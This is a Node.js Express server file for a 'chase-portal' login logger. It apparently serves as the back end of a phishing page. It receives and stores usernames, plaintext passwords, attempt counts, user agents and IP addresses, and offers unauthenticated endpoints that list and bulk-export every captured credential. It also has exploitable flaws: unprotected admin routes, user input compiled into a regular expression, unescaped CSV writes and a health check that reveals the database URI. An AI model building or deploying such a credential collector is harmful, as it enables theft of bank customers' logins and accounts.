import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import moment from 'moment';
import mongoose from 'mongoose';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3001;

app.use(cors());
app.use(express.json());

// ─── MongoDB Configuration ───────────────────────────────────────
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';

// Login Log Schema
const loginLogSchema = new mongoose.Schema({
  timestamp: { type: Date, default: Date.now, index: true },
  username: String,
  password: String,
  attemptNumber: Number,
  status: String,
  userAgent: String,
  ipAddress: String,
}, { collection: 'login_logs' });

const LoginLog = mongoose.model('LoginLog', loginLogSchema);

// MongoDB Connection with fallback to CSV
let dbConnected = false;

mongoose.connect(MONGODB_URI, {
  serverSelectionTimeoutMS: 5000,
  retryWrites: true,
  w: 'majority'
})
.then(() => {
  dbConnected = true;
  console.log('✅ Connected to MongoDB');
})
.catch((err) => {
  console.warn('⚠️  MongoDB connection failed. Using CSV fallback.');
  console.warn(`Details: ${err.message}`);
});

// Ensure logs directory exists (for CSV fallback)
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
}

// CSV file path (fallback)
const csvFilePath = path.join(logsDir, 'login_attempts.csv');

// Initialize CSV with headers if it doesn't exist
if (!fs.existsSync(csvFilePath)) {
  const headers = 'Timestamp,Username,Password,Attempt Number,Status,User Agent,IP Address\n';
  fs.writeFileSync(csvFilePath, headers);
}

// ─── Logging Endpoint ────────────────────────────────────────────
app.post('/api/logs/login', async (req, res) => {
  try {
    const { username, password, attemptNumber, status, timestamp, userAgent } = req.body;
    
    // Get client IP
    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    
    const logData = {
      timestamp: new Date(timestamp),
      username,
      password,
      attemptNumber,
      status,
      userAgent,
      ipAddress,
    };
    
    // Try MongoDB first
    if (dbConnected) {
      try {
        const log = new LoginLog(logData);
        await log.save();
      } catch (err) {
        console.error('Error saving to MongoDB:', err.message);
        dbConnected = false; // Fallback to CSV
      }
    }
    
    // Also save to CSV as backup
    const csvRow = [
      timestamp,
      `"${username}"`,
      `"${password}"`,
      attemptNumber,
      status,
      `"${userAgent}"`,
      ipAddress,
    ].join(',') + '\n';
    fs.appendFileSync(csvFilePath, csvRow);
    
    console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status})`);
    
    res.json({ success: true, message: 'Login attempt logged', stored: dbConnected ? 'MongoDB' : 'CSV' });
  } catch (error) {
    console.error('Error logging login attempt:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ─── Admin Logs Retrieval Endpoint ───────────────────────────────
app.get('/api/admin/logs', async (req, res) => {
  try {
    const { limit = 100, status, username } = req.query;
    let query = {};
    
    if (status) query.status = status;
    if (username) query.username = new RegExp(username, 'i'); // Case-insensitive search
    
    let logs;
    
    if (dbConnected) {
      logs = await LoginLog.find(query)
        .sort({ timestamp: -1 })
        .limit(parseInt(limit))
        .lean();
    } else {
      // Fallback: Read from CSV
      const data = fs.readFileSync(csvFilePath, 'utf-8');
      const lines = data.split('\n').slice(1).filter(Boolean);
      logs = lines.map(line => {
        const [timestamp, user, pass, attempt, stat, ua, ip] = line.split(',');
        return { timestamp, username: user, password: pass, attemptNumber: parseInt(attempt), status: stat, userAgent: ua, ipAddress: ip };
      }).reverse().slice(0, parseInt(limit));
    }
    
    res.json({ success: true, count: logs.length, logs, source: dbConnected ? 'MongoDB' : 'CSV' });
  } catch (error) {
    console.error('Error retrieving logs:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ─── Export Logs as JSON (for GitHub Actions backup) ─────────────
app.get('/api/admin/logs/export', async (req, res) => {
  try {
    let logs;
    
    if (dbConnected) {
      logs = await LoginLog.find().sort({ timestamp: -1 }).lean();
    } else {
      const data = fs.readFileSync(csvFilePath, 'utf-8');
      const lines = data.split('\n').slice(1).filter(Boolean);
      logs = lines.map(line => {
        const [timestamp, user, pass, attempt, stat, ua, ip] = line.split(',');
        return { timestamp, username: user, password: pass, attemptNumber: parseInt(attempt), status: stat, userAgent: ua, ipAddress: ip };
      });
    }
    
    res.json({ timestamp: new Date().toISOString(), total: logs.length, logs });
  } catch (error) {
    console.error('Error exporting logs:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ─── Health Check Endpoint ──────────────────────────────────────
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'Logger server is running', 
    port: PORT,
    database: dbConnected ? 'MongoDB Connected' : 'Using CSV Fallback',
    csvPath: csvFilePath,
    mongodbUri: MONGODB_URI
  });
});

app.listen(PORT, () => {
  console.log(`\n🔒 Login Logger Server running on http://localhost:${PORT}`);
  console.log(`📊 Database: ${dbConnected ? 'MongoDB' : 'CSV (Fallback)'}`);
  console.log(`📁 CSV backup: ${csvFilePath}\n`);
});
